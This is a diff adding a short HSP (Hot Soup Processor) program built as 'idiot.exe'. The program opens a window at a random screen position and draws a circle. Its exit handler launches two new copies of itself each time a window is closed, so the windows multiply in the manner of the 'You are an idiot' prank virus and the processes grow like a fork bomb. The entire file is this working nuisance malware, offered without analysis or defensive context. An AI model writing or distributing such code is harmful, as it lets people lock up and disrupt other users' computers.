@@ -1,0 +1,18 @@
+#packopt name "idiot.exe"
+randomize
+screen 0,400,400,0,rnd(1200),rnd(700),400,400
+repeat
+	redraw 0
+		color 255,255,255
+		boxf
+		color 0,0,0
+		circle 50,50,350,350
+	redraw 1
+onexit goto *hoge
+wait 1
+loop
+
+*hoge
+	exec "idiot.exe"
+	exec "idiot.exe"
+end
